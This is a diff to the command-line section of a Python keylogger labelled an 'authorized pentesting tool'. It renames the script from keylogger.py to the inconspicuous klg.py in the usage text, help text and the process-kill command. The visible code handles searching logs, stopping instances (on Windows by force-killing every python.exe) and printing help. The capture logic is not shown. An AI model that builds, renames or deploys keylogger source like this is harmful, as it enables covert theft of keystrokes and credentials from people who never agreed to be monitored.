@@ -544,24 +544,24 @@ if __name__ == "__main__":
             if len(sys.argv) > 2:
                 KeylogDecoder.search_log(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else None)
             else:
-                print("Usage: python keylogger.py --search <pattern> [log_path]")
+                print("Usage: python klg.py --search <pattern> [log_path]")
         elif cmd == "--stop" or cmd == "-k":
             # Kill all running instances
             if platform.system() == "Windows":
                 os.system("taskkill /f /im python.exe /fi \"WINDOWTITLE eq *\" 2>nul")
             else:
-                os.system("pkill -f keylogger.py 2>/dev/null")
+                os.system("pkill -f klg.py 2>/dev/null")
             print("[*] Keylogger instances terminated.")
         elif cmd == "--help" or cmd == "-h":
             print("""
 Advanced Keylogger - Authorized Pentesting Tool
 ===============================================
 Usage:
-    python keylogger.py              Start the keylogger
-    python keylogger.py --read       Read the log file
-    python keylogger.py --search <p> Search logs for pattern
-    python keylogger.py --stop       Stop all instances
-    python keylogger.py --help       Show this help
+    python klg.py              Start the keylogger
+    python klg.py --read       Read the log file
+    python klg.py --search <p> Search logs for pattern
+    python klg.py --stop       Stop all instances
+    python klg.py --help       Show this help
             """)
         else:
             print(f"Unknown command: {cmd}")
